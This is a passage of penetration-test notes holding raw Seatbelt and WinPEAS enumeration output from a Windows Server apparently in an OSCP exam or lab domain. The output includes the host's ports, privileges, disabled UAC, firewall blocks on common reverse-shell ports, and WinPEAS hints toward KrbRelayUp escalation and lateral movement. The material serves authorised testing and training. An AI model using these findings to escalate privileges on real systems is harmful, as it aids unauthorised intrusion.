  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware, Inc.
  FileDescription                : VMware Tools Core Service
  Version                        : 12.1.0.37487
  IsDotNet                       : False

====== SlackDownloads ======

====== SlackPresence ======

====== SlackWorkspaces ======

====== SuperPutty ======

====== Sysmon ======

ERROR: Unable to collect. Must be an administrator.
====== SysmonEvents ======

ERROR: Unable to collect. Must be an administrator.
====== TcpConnections ======

  Local Address          Foreign Address        State      PID   Service         ProcessName
  0.0.0.0:135            0.0.0.0:0              LISTEN     872   RpcSs           svchost.exe
  0.0.0.0:445            0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:1433           0.0.0.0:0              LISTEN     4104  MSSQLSERVER     sqlservr.exe
  0.0.0.0:3389           0.0.0.0:0              LISTEN     248   TermService     svchost.exe
  0.0.0.0:5985           0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:8080           0.0.0.0:0              LISTEN     4268                  java.exe
  0.0.0.0:47001          0.0.0.0:0              LISTEN     4                     System
  0.0.0.0:49664          0.0.0.0:0              LISTEN     500                   wininit.exe
  0.0.0.0:49665          0.0.0.0:0              LISTEN     1132  EventLog        svchost.exe
  0.0.0.0:49666          0.0.0.0:0              LISTEN     1688  Schedule        svchost.exe
  0.0.0.0:49667          0.0.0.0:0              LISTEN     644   Netlogon        lsass.exe
  0.0.0.0:49668          0.0.0.0:0              LISTEN     2328  SessionEnv      svchost.exe
  0.0.0.0:49669          0.0.0.0:0              LISTEN     644                   lsass.exe
  0.0.0.0:49670          0.0.0.0:0              LISTEN     624                   services.exe
  127.0.0.1:135          127.0.0.1:57744        ESTAB      872   RpcSs           svchost.exe
  127.0.0.1:1434         0.0.0.0:0              LISTEN     4104  MSSQLSERVER     sqlservr.exe
  127.0.0.1:57744        127.0.0.1:135          ESTAB      5600                  "C:\Users\b.martin\Seatbelt.exe" -group=all
  172.16.104.202:139     0.0.0.0:0              LISTEN     4                     System
  172.16.104.202:3389    172.16.104.206:57741   ESTAB      248   TermService     svchost.exe
  172.16.104.202:57728   172.16.104.200:135     TIME_WAIT  0                     System Idle Process
  172.16.104.202:57729   172.16.104.200:49677   TIME_WAIT  0                     System Idle Process
  172.16.104.202:57730   172.16.104.200:49667   ESTAB      644                   lsass.exe
  172.16.104.202:57736   172.16.104.206:445     ESTAB      4                     System
  172.16.104.202:57737   172.16.104.206:445     ESTAB      4                     System
  172.16.104.202:57738   172.16.104.206:445     ESTAB      4                     System
  172.16.104.202:57739   172.16.104.206:445     ESTAB      4                     System
  172.16.104.202:57740   192.168.104.206:445    SYN_SENT   4                     System
  172.16.104.202:57741   192.168.104.206:445    SYN_SENT   4                     System
  172.16.104.202:57742   192.168.104.206:445    SYN_SENT   4                     System
  172.16.104.202:57743   192.168.104.206:445    SYN_SENT   4                     System
====== TokenGroups ======

Current Token's Groups

  OSCP\Domain Users                        S-1-5-21-2481101513-2954867870-2660283483-513
  Everyone                                 S-1-1-0
  BUILTIN\Remote Desktop Users             S-1-5-32-555
  BUILTIN\Users                            S-1-5-32-545
  NT AUTHORITY\REMOTE INTERACTIVE LOGON    S-1-5-14
  NT AUTHORITY\INTERACTIVE                 S-1-5-4
  NT AUTHORITY\Authenticated Users         S-1-5-11
  NT AUTHORITY\This Organization           S-1-5-15
  LOCAL                                    S-1-2-0
  OSCP\Travel Agents                       S-1-5-21-2481101513-2954867870-2660283483-1137
  Authentication authority asserted identity S-1-18-1
====== TokenPrivileges ======

Current Token's Privileges

                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
                SeIncreaseWorkingSetPrivilege:  DISABLED
====== UAC ======

  0                              : 1 - No prompting
  EnableLUA (Is UAC enabled?)    : 0
  LocalAccountTokenFilterPolicy  : 1
  FilterAdministratorToken       : 1
    [*] UAC is disabled.
    [*] Any administrative local account can be used for lateral movement.
====== UdpConnections ======

  Local Address          PID    Service                 ProcessName
  0.0.0.0:123            8      W32Time                 svchost.exe
  0.0.0.0:500            2544   IKEEXT                  svchost.exe
  0.0.0.0:3389           248    TermService             svchost.exe
  0.0.0.0:4500           2544   IKEEXT                  svchost.exe
  0.0.0.0:5353           1124   Dnscache                svchost.exe
  0.0.0.0:5355           1124   Dnscache                svchost.exe
  127.0.0.1:53684        644    Netlogon                lsass.exe
  127.0.0.1:54907        2228   iphlpsvc                svchost.exe
  127.0.0.1:59779        1308   NlaSvc                  svchost.exe
  127.0.0.1:62025        1424   gpsvc                   svchost.exe
  172.16.104.202:137     4                              System
  172.16.104.202:138     4                              System
====== UserRightAssignments ======

Must be an administrator to enumerate User Right Assignments
====== WifiProfile ======

ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
   at Seatbelt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
   at Seatbelt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== WindowsAutoLogon ======

  DefaultDomainName              : 
  DefaultUserName                : 
  DefaultPassword                : 
  AltDefaultDomainName           : 
  AltDefaultUserName             : 
  AltDefaultPassword             : 

====== WindowsCredentialFiles ======

====== WindowsDefender ======

Locally-defined Settings:



GPO-defined Settings:
====== WindowsEventForwarding ======

====== WindowsFirewall ======

Collecting Windows Firewall Non-standard Rules


Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy

Domain Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : BLOCK
    DefaultOutboundAction    : ALLOW

Public Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : BLOCK
    DefaultOutboundAction    : ALLOW

Standard Profile
    Enabled                  : True
    DisableNotifications     : True
    DefaultInboundAction     : BLOCK
    DefaultOutboundAction    : ALLOW

Rules:

  Name                 : Block Outbound 4444
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :4444

  Name                 : Block Outbound 1234
  Description          : 
  ApplicationName      : 
  Protocol             : TCP
  Action               : Block
  Direction            : Out
  Profiles             : 
  Local Addr:Port      : :
  Remote Addr:Port     : :1234

====== WindowsVault ======


  Vault GUID     : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
  Vault Type     : Web Credentials
  Item count     : 0

  Vault GUID     : 77bc582b-f0a6-4e15-4e80-61736b6f3b29
  Vault Type     : Windows Credentials
  Item count     : 0
====== WMI ======

  AdminPasswordStatus           : 1
  AutomaticManagedPagefile      : True
  AutomaticResetBootOption      : True
  AutomaticResetCapability      : True
  BootOptionOnLimit             : 3
  BootOptionOnWatchDog          : 3
  BootROMSupported              : True
  BootStatus(UInt16[])          : 0,0,0,33,31,162,0,3,2,2
  BootupState                   : Normal boot
  Caption                       : SRV22
  ChassisBootupState            : 3
  CreationClassName             : Win32_ComputerSystem
  CurrentTimeZone               : -480
  DaylightInEffect              : False
  Description                   : AT/AT COMPATIBLE
  DNSHostName                   : SRV22
  Domain                        : oscp.exam
  DomainRole                    : 3
  EnableDaylightSavingsTime     : True
  FrontPanelResetStatus         : 3
  HypervisorPresent             : True
  InfraredSupported             : False
  KeyboardPasswordStatus        : 3
  Manufacturer                  : VMware, Inc.
  Model                         : VMware7,1
  Name                          : SRV22
  NetworkServerModeEnabled      : True
  NumberOfLogicalProcessors     : 2
  NumberOfProcessors            : 1
  OEMStringArray(String[])      :
      [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine
  PartOfDomain                  : True
  PauseAfterReset               : 3932100000
  PCSystemType                  : 1
  PCSystemTypeEx                : 1
  PowerOnPasswordStatus         : 0
  PowerState                    : 0
  PowerSupplyState              : 3
  PrimaryOwnerName              : Windows User
  ResetCapability               : 1
  ResetCount                    : -1
  ResetLimit                    : -1
  Roles(String[])               :
      LM_Workstation
      LM_Server
      SQLServer
      NT
      Server_NT
  Status                        : OK
  SystemType                    : x64-based PC
  ThermalState                  : 3
  TotalPhysicalMemory           : 4293939200
  WakeUpType                    : 6

====== WMIEventConsumer ======

  Name                              :   SCM Event Log Consumer
  ConsumerType                      :   S-1-5-32-544
  CreatorSID                        :   NTEventLogEventConsumer
  Category                          :   0
  EventID                           :   0
  EventType                         :   1
  InsertionStringTemplates          :   System.String[]
  MachineName                       :   
  MaximumQueueSize                  :   
  Name                              :   SCM Event Log Consumer
  NameOfRawDataProperty             :   
  NameOfUserSIDProperty             :   sid
  NumberOfInsertionStrings          :   0
  SourceName                        :   Service Control Manager
  UNCServerName                     :   
====== WMIEventFilter ======

  Name                           : SCM Event Log Filter
  Namespace                      : ROOT\Subscription
  EventNamespace                 : root\cimv2
  Query                          : select * from MSFT_SCMEventLogEvent
  QueryLanguage                  : WQL
  EventAccess                    : 
  CreatorSid                     : S-1-5-32-544

====== WMIFilterBinding ======

  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
  CreatorSID                     : S-1-5-32-544

====== WSUS ======

  UseWUServer                    : False
  Server                         : 
  AlternateServer                : 
  StatisticsServer               : 



[*] Completed collection in 18.872 seconds


```


---

# WinPEAS結果抽出（長文注意）

```powershell
 [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.

  WinPEAS-ng by @hacktricks_live

       /---------------------------------------------------------------------------------\
       |                             Do you like PEASS?                                  |
       |---------------------------------------------------------------------------------| 
       |         Learn Cloud Hacking       :     training.hacktricks.xyz                 |
       |         Follow on Twitter         :     @hacktricks_live                        |
       |         Respect on HTB            :     SirBroccoli                             |
       |---------------------------------------------------------------------------------|
       |                                 Thank you!                                      |
       \---------------------------------------------------------------------------------/

  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

 You can find a Windows local PE Checklist here: https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
   Creating Dynamic lists, this could take a while, please wait...
   - Loading sensitive_files yaml definitions file...
   - Loading regexes yaml definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


════════════════════════════════════╣ System Information ╠════════════════════════════════════

╔══════════╣ Basic System Information
╚ Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits
    OS Name: Microsoft Windows Server 2019 Standard
    OS Version: 10.0.17763 N/A Build 17763
    System Type: x64-based PC
    Hostname: SRV22
    Domain Name: oscp.exam
    ProductName: Windows Server 2019 Standard
    EditionID: ServerStandard
    ReleaseId: 1809
    BuildBranch: rs5_release
    CurrentMajorVersionNumber: 10
    CurrentVersion: 6.3
    Architecture: AMD64
    ProcessorCount: 2
    SystemLang: en-US
    KeyboardLang: Japanese (Japan)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 2/22/2026 5:57:46 AM
    HighIntegrity: False
    PartOfDomain: True
    Hotfixes: KB4514366 (9/7/2019), KB4512577 (9/7/2019), KB4512578 (9/7/2019), 


╔══════════╣ Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

╔══════════╣ System Last Shutdown Date/time (from Registry)

    Last Shutdown Date/time        :    10/22/2024 6:54:41 AM

╔══════════╣ User Environment Variables
╚ Check for some passwords or keys in the env variables 
    COMPUTERNAME: SRV22
    USERPROFILE: C:\Users\b.martin
    HOMEPATH: \Users\b.martin
    LOCALAPPDATA: C:\Users\b.martin\AppData\Local
    PSModulePath: C:\Users\b.martin\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\;C:\Users\b.martin\AppData\Local\Microsoft\WindowsApps;
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LOGONSERVER: \\DC20
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    HOMEDRIVE: C:
    SystemRoot: C:\Windows
    TEMP: C:\Users\BF116~1.MAR\AppData\Local\Temp\2
    SESSIONNAME: RDP-Tcp#0
    ALLUSERSPROFILE: C:\ProgramData
    DriverData: C:\Windows\System32\Drivers\DriverData
    FPS_BROWSER_APP_PROFILE_STRING: Internet Explorer
    APPDATA: C:\Users\b.martin\AppData\Roaming
    PROCESSOR_REVISION: 4f01
    USERNAME: b.martin
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles: C:\Program Files\Common Files
    CLIENTNAME: kali
    OS: Windows_NT
    USERDOMAIN_ROAMINGPROFILE: OSCP
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    SystemDrive: C:
    FPS_BROWSER_USER_PROFILE_STRING: Default
    ProgramFiles: C:\Program Files
    NUMBER_OF_PROCESSORS: 2
    TMP: C:\Users\BF116~1.MAR\AppData\Local\Temp\2
    ProgramData: C:\ProgramData
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    USERDOMAIN: OSCP
    PUBLIC: C:\Users\Public
    USERDNSDOMAIN: OSCP.EXAM

╔══════════╣ System Environment Variables
╚ Check for some passwords or keys in the env variables 
    ComSpec: C:\Windows\system32\cmd.exe
    DriverData: C:\Windows\System32\Drivers\DriverData
    OS: Windows_NT
    Path: C:\Program Files\Common Files\Oracle\Java\javapath;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\Tools\Binn\;C:\Program Files\Microsoft SQL Server\150\DTS\Binn\
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PROCESSOR_ARCHITECTURE: AMD64
    PSModulePath: C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Microsoft SQL Server\150\Tools\PowerShell\Modules\
    TEMP: C:\Windows\TEMP
    TMP: C:\Windows\TEMP
    USERNAME: SYSTEM
    windir: C:\Windows
    NUMBER_OF_PROCESSORS: 2
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
    PROCESSOR_REVISION: 4f01

╔══════════╣ Audit Settings
╚ Check what is being logged 
    Not Found

╔══════════╣ Audit Policy Settings - Classic & Advanced

╔══════════╣ WEF Settings
╚ Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

╔══════════╣ LAPS Settings
╚ If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

╔══════════╣ Wdigest
╚ If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest
    Wdigest is not enabled

╔══════════╣ LSA Protection
╚ If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection
    LSA Protection is not enabled

╔══════════╣ Credentials Guard
╚ If enabled, a driver is needed to read LSASS memory https://book.hacktricks.wiki/windows-hardening/stealing-credentials/credentials-protections#credentials-guard
    CredentialGuard is not enabled
    Virtualization Based Security Status:      Not enabled
    Configured:                                False
    Running:                                   False

╔══════════╣ Cached Creds
╚ If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials
    cachedlogonscount is 10

╔══════════╣ Enumerating saved credentials in Registry (CurrentPass)

╔══════════╣ AV Information
  [X] Exception: Invalid namespace 
    No AV was detected!!
    Not Found

╔══════════╣ Windows Defender configuration
  Local Settings
  Group Policy Settings

╔══════════╣ UAC Status
╚ If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#from-administrator-medium-to-high-integrity-level--uac-bypasss
    ConsentPromptBehaviorAdmin: 0 - No prompting
    EnableLUA: 0
    LocalAccountTokenFilterPolicy: 1
    FilterAdministratorToken: 1
      [*] EnableLUA != 1, UAC policies disabled.
      [+] Any local account can be used for lateral movement.

╔══════════╣ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 638B

╔══════════╣ Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

╔══════════╣ PS default transcripts history
╚ Read the PS history inside these files (if any)

╔══════════╣ HKCU Internet Settings
    DisableCachingOfSSLPages: 1
    IE5_UA_Backup_Flag: 5.0
    PrivacyAdvanced: 1
    SecureProtocols: 2688
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    CertificateRevocation: 1
    ZonesSecurityUpgrade: System.Byte[]
    WarnonZoneCrossing: 1

╔══════════╣ HKLM Internet Settings
    ActiveXCache: C:\Windows\Downloaded Program Files
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    MinorVersion: 0
    WarnOnIntranet: 1

╔══════════╣ Drives Information
╚ Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 36 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])
    D:\ (Type: CDRom)

╔══════════╣ Checking WSUS
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus
    Not Found

╔══════════╣ Checking KrbRelayUp
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#krbrelayup
  The system is inside a domain (OSCP) so it could be vulnerable.
╚ You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges

╔══════════╣ Checking If Inside Container
╚ If the binary cexecsvc.exe or associated service exists, you are inside Docker 
You are NOT inside a container

╔══════════╣ Checking AlwaysInstallElevated
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated isn't available

╔══════════╣ Enumerate LSA settings - auth packages included

    auditbasedirectories                 :       0
    auditbaseobjects                     :       0
    Bounds                               :       00-30-00-00-00-20-00-00
    crashonauditfail                     :       0
    fullprivilegeauditing                :       00
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Security Packages                    :       ""
    Notification Packages                :       rassfm,scecli
    Authentication Packages              :       msv1_0
    LsaPid                               :       644
    LsaCfgFlagsDefault                   :       0
    SecureBoot                           :       1
    ProductType                          :       7
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       0
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1
    SCENoApplyLegacyAuditPolicy          :       0
    TurnOffAnonymousBlock                :       0
    LsaConfigFlags                       :       0
    RunAsPPL                             :       0
    RunAsPPLBoot                         :       0

╔══════════╣ Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)


  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)


  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

╔══════════╣ Display Local Group Policy settings - local users/machine
   Type             :     user
   Display Name     :     Local Group Policy
   Name             :     Local Group Policy
   Extensions       :     [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F73-3407-48AE-BA88-E8213C6761F1}]
   File Sys Path    :     C:\Windows\System32\GroupPolicy\User
   Link             :     Local
   GPO Link         :     Local Machine
   Options          :     All Sections Enabled

   =================================================================================================


╔══════════╣ Potential GPO abuse vectors (applied domain GPOs writable by current user)
    No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.

╔══════════╣ Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



╔══════════╣ Enumerating Printers (WMI)

╔══════════╣ Enumerating Named Pipes
  Name                                                                                                 CurrentUserPerms                                                       Sddl

  eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)

  ROUTER                                                                                               Everyone [Allow: WriteData/CreateFiles]                                O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)

  sql\query                                                                                            Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  SQLLocal\MSSQLSERVER                                                                                 Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003G:S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003D:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003)

  vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)


╔══════════╣ Enumerating AMSI registered providers

╔══════════╣ Enumerating Sysmon configuration
      You must be an administrator to run this check

╔══════════╣ Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

╔══════════╣ Installed .NET versions

  CLR Versions
   4.0.30319

  .NET Versions
   4.7.03190

  .NET & AMSI (Anti-Malware Scan Interface) support
      .NET version supports AMSI     : False
      OS supports AMSI               : True


════════════════════════════════════╣ Interesting Events information ╠════════════════════════════════════

╔══════════╣ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials

      You must be an administrator to run this check

╔══════════╣ Printing Account Logon Events (4624) for the last 10 days.

      You must be an administrator to run this check

╔══════════╣ Process creation events - searching logs (EID 4688) for sensitive data.

      You must be an administrator to run this check

╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        Write-CWarningOnce -Message ('You passed a plain text password to `Initialize-CLcm`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $CertPassword -and $CertPassword -isnot [securestring] )
ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
}
$thumbprint = $null
if( $CertificateID )
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -String $CertPassword -AsPlainText -Force


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        Write-CWarningOnce -Message ('You passed a plain text password to `Install-CCertificate`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $Password -and $Password -isnot [securestring] )
ConvertTo-SecureString -String $Password -AsPlainText -Force
}
if( $PSCmdlet.ParameterSetName -like 'FromFile*' )
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -String $Password -AsPlainText -Force


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Removes users or groups from a *local* group.
.SYNOPSIS
net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.
So, this function removes users or groups from a *local* group.
If the user or group is not a member, nothing happens.
`Remove-CGroupMember` is new in Carbon 2.0.
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net localgroup`, but that won't accept user/group names longer than 24 characters.  This means you have to use the .NET Directory Services APIs.  How do you reliably remove both users *and* groups?  What if those users are in a domain?  What if they're in another domain?  What about built-in users?  Fortunately, your brain hasn't exploded.


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        {
if( $Password -is [string] )
{
ConvertTo-SecureString -AsPlainText -Force -String $Password
}
elseif( $Password -isnot [securestring] )
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -AsPlainText -Force -String $Password


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        {
if( $PSCmdlet.ParameterSetName -like 'CustomAccount*' -and -not $Credential )
{
net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)
}
else
{
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        net.microsoft.com/en-us/library/dd548356.aspx.)  If not, please use the `Credential` parameter to pass the account''s credentials.' -f $Name,$UserName)


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Gets the IP addresses in use on the local computer.
.SYNOPSIS
network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.
If you *do* care about network interfaces, then you'll have to do it yourself using the [System.Net.NetworkInformation.NetworkInterface](http://msdn.microsoft.com/en-us/library/System.Net.NetworkInformation.NetworkInterface.aspx) class's [GetAllNetworkInterfaces](http://msdn.microsoft.com/en-us/library/system.net.networkinformation.networkinterface.getallnetworkinterfaces.aspx) static method, e.g.
[Net.NetworkInformation.NetworkInterface]::GetNetworkInterfaces()
.LINK
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        network intefaces is pretty cumbersome.  If all you care about is getting the IP addresses in use on the current computer, and you don't care where/how they're used, use this function.


   =================================================================================================

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        .DESCRIPTION
Adds a users or groups to a *local* group.
.SYNOPSIS
